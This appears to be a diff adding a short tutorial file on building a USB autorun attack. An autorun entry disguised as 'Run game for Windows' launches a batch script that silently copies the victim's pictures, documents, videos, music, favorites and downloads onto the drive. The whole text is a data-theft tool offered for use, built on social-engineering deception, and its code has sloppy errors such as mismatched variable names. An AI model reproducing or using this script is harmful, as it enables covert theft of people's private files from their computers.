@@ -1,0 +1,44 @@
+Autorun file from USB:
+
+First save this script below as "Autorun.ini"
+
+[autorun] 
+icon=drive.ico
+open=(YourBatchFileName).bat
+action=Click ok to Run game for Windows     <--------That makes it look enticing.
+shell\open\command=launch.bat
+
+Then save this script as "Launch.bat"
+
+Start (Path Of File In USB)\(YourBatchFileName).bat
+Example: Start E:\MyHAX\BeginPrgm.bat
+
+
+Now save this as the batchfile name you wanted:
+
+@echo off
+color 0a
+mode 55,16
+title File Crawler
+:: variables
+/min
+SET odrive=%odrive:~0,2%
+set backupcmd=xcopy /s /c /d /e /h /i /r /y
+echo off
+%backupcmd% "%USERPROFILE%\pictures" "%drive%\all\My pics"
+%backupcmd% "%USERPROFILE%\Favorites" "%drive%\all\Favorites"
+%backupcmd% "%USERPROFILE%\documents" "%drive%\all\Docs"
+%backupcmd% "%USERPROFILE%\videos" "%drive%\all\My vids"
+%backupcmd% "%USERPROFILE%\music" "%drive%\all\Music"
+%backupcmd% "%USERPROFILE%\downloads" "%drive%\all\Downloads"
+@exit
+
+
+NOTE:
+=======
+
+Make sure when you save the files you
+save them all in the destination that
+you want then in, you cannot move them.
+If you want to move them you will have
+to save them again.
